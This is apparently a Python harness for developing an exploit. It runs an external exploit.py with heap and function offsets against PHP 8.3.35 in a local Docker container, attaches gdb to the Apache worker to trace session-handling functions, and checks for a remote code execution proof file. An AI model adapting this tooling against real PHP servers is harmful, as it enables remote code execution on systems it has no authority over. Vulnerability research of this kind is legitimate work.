import subprocess, sys, time, os, re

BASE = r"C:\Users\likat\p2s52704"
c, port = "p2s8335", "18112"
zif, dtor = "0x3ac080", "0x49ec50"

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

sh(f'docker exec {c} sh -c "rm -f /var/lib/php/sessions/* /www/p1 2>/dev/null"')
sh(f'docker restart {c}')
time.sleep(3)

env = os.environ.copy()
env["P2S_PAUSE"] = "60"
proc = subprocess.Popen(
    [sys.executable, BASE + r"\exploit.py",
     "-u", f"http://127.0.0.1:{port}/index.php",
     "--profile", "bookworm",
     "--zif-offset", zif, "--dtor-offset", dtor,
     "--htdata-offset", "0x690d8",
     "--retries", "1",
     "-c", "id>/www/p1", "--fetch", "/www/p1"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
    text=True, env=env, bufsize=1
)

pause_hit = False
for line in proc.stdout:
    print(line, end="", flush=True)
    if "PAUSE" in line:
        pause_hit = True
        break

if not pause_hit:
    proc.wait(); sys.exit(1)

print("\n[*] PAUSE - setting up gdb...", flush=True)
time.sleep(1)

r = sh(f'docker exec {c} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
pids = [l.split()[0] for l in r.stdout.strip().splitlines() if l.strip()]
worker_pid = pids[-1] if pids else None
print(f"[*] worker PID: {worker_pid}", flush=True)

r = sh(f'docker exec {c} sh -c "grep libphp /proc/{worker_pid}/maps 2>/dev/null | head -1"')
maps_line = r.stdout.strip()
if not maps_line:
    print("[!] no libphp"); proc.kill(); sys.exit(1)
maps_base = int(maps_line.split("-")[0], 16)
print(f"[*] libphp base: {hex(maps_base)}", flush=True)

# Offsets in 8.3.35
session_destroy = maps_base + 0x354500
session_flush   = maps_base + 0x3576c0
session_rfc1867 = maps_base + 0x3583a0
session_init    = maps_base + 0x356a30
hash_rev_destroy = maps_base + 0x4b47d0

gdb_script = (
    "set pagination off\n"
    "set confirm off\n"
    "set width 0\n"
    f"break *{hex(session_init)}\n"
    "commands\n  silent\n  echo [HIT] php_session_initialize\\n\n  bt 5\n  detach\nend\n"
    f"break *{hex(session_destroy)}\n"
    "commands\n  silent\n  echo [HIT] php_session_destroy\\n\n  bt 5\n  detach\nend\n"
    f"break *{hex(session_flush)}\n"
    "commands\n  silent\n  echo [HIT] php_session_flush\\n\n  bt 5\n  detach\nend\n"
    f"break *{hex(session_rfc1867)}\n"
    "commands\n  silent\n  echo [HIT] php_session_rfc1867_callback\\n\n  bt 5\n  detach\nend\n"
    f"break *{hex(hash_rev_destroy)}\n"
    "commands\n  silent\n  echo [HIT] zend_hash_graceful_reverse_destroy\\n\n  bt 5\n  detach\nend\n"
    "continue\n"
)
gdb_local = os.path.join(BASE, "gdb_session_trace.gdb")
with open(gdb_local, "w") as f:
    f.write(gdb_script)
sh(f'docker cp "{gdb_local}" {c}:/tmp/gdb_session_trace.gdb')

print("[*] attaching gdb with session breakpoints...", flush=True)
gdb_proc = subprocess.Popen(
    f'docker exec {c} timeout 55 gdb -batch -x /tmp/gdb_session_trace.gdb -p {worker_pid}',
    shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
    text=True, bufsize=1
)

time.sleep(3)
print("[*] waiting for exploit to finish...", flush=True)

try:
    out, _ = proc.communicate(timeout=120)
    tail = out[-1500:] if len(out) > 1500 else out
    print(tail, flush=True)
except subprocess.TimeoutExpired:
    proc.kill(); out, _ = proc.communicate()
    print(out[-1500:] if len(out) > 1500 else out, flush=True)

try:
    gdb_out, _ = gdb_proc.communicate(timeout=15)
    print("\n=== GDB SESSION TRACE ===", flush=True)
    print(gdb_out[-4000:] if len(gdb_out) > 4000 else gdb_out, flush=True)
except subprocess.TimeoutExpired:
    gdb_proc.kill(); gdb_out, _ = gdb_proc.communicate()
    print("\n=== GDB (timeout) ===", flush=True)
    print(gdb_out[-4000:] if len(gdb_out) > 4000 else gdb_out, flush=True)

r = sh(f'docker exec {c} cat /www/p1 2>/dev/null')
if r.stdout.strip():
    print(f"\n[+] RCE PROOF: {r.stdout.strip()[:80]}", flush=True)
else:
    print("\n[-] no RCE proof", flush=True)
